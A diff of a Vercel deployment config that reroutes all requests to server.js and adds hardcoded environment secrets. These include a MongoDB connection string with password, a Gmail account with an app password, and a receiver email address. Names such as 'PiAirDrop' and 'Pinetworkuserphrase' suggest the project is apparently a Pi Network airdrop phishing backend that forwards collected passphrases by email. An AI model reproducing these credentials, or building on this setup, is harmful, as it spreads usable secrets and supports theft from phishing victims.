@@ -2,14 +2,29 @@
   "version": 2,
   "builds": [
     {
-      "src": "/index.js",
+      "src": "server.js",
       "use": "@vercel/node"
     }
   ],
   "routes": [
     {
+      "src": "/socket.io/(.*)",
+      "dest": "server.js"
+    },
+    {
+      "src": "/api/(.*)",
+      "dest": "server.js"
+    },
+    {
       "src": "/(.*)",
-      "dest": "/"
+      "dest": "server.js"
     }
-  ]
+  ],
+  "env": {
+    "MONGOURI": "mongodb+srv://zedd:Andrew_19929272281995@piairdrop.iu5zk.mongodb.net/?retryWrites=true&w=majority&appName=PiAirDrop",
+    "EMAIL_USER": "Pinetworkuserphrase@gmail.com",
+    "EMAIL_PASS": "npfnzifqrtztljdc",
+    "RECEIVER_EMAIL": "nwiboazubuike@gmail.com",
+    "FRONTEND_URL": "https://xxx-dark-7t42.vercel.app"
+  }
 }
